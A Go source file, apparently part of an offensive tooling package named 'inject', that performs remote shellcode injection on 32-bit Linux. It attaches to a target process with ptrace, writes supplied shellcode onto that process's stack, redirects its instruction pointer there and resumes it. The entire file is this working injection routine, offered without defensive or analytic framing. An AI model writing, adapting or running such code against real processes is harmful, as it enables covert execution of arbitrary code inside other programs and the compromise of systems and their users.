//go:build linux && 386

package inject

import (
	"fmt"
	"syscall"
)

// sysMemfdCreate is the memfd_create syscall number on x86.
const sysMemfdCreate = 356

// injectPtrace uses ptrace for remote injection (x86).
func (l *linuxInjector) injectPtrace(shellcode []byte) error {
	if l.config.PID == 0 {
		return fmt.Errorf("PID required for ptrace injection")
	}

	pid := l.config.PID

	if err := syscall.PtraceAttach(pid); err != nil {
		return fmt.Errorf("PTRACE_ATTACH failed: %w (check ptrace_scope or permissions)", err)
	}
	defer syscall.PtraceDetach(pid)

	var ws syscall.WaitStatus
	_, err := syscall.Wait4(pid, &ws, 0, nil)
	if err != nil {
		return fmt.Errorf("wait4 failed: %w", err)
	}
	if !ws.Stopped() {
		return fmt.Errorf("process not stopped after attach")
	}

	var regs syscall.PtraceRegs
	if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
		return fmt.Errorf("PTRACE_GETREGS failed: %w", err)
	}

	originalESP := uint32(regs.Esp)

	shellcodeSize := (len(shellcode) + 15) &^ 15
	stackAddr := originalESP - uint32(shellcodeSize) - 128
	stackAddr &^= 0xF

	for i := 0; i < len(shellcode); i += 4 {
		end := i + 4
		if end > len(shellcode) {
			end = len(shellcode)
		}
		chunk := shellcode[i:end]

		if len(chunk) < 4 {
			padded := make([]byte, 4)
			copy(padded, chunk)
			chunk = padded
		}

		addr := uintptr(stackAddr) + uintptr(i)

		_, err := syscall.PtracePokeData(pid, addr, chunk)
		if err != nil {
			return fmt.Errorf("PTRACE_POKEDATA failed at offset %d: %w", i, err)
		}
	}

	regs.Eip = int32(stackAddr)
	regs.Esp = int32(stackAddr - 4)

	if err := syscall.PtraceSetRegs(pid, &regs); err != nil {
		return fmt.Errorf("PTRACE_SETREGS failed: %w", err)
	}

	if err := syscall.PtraceCont(pid, 0); err != nil {
		return fmt.Errorf("ptrace cont: %w", err)
	}

	return nil
}
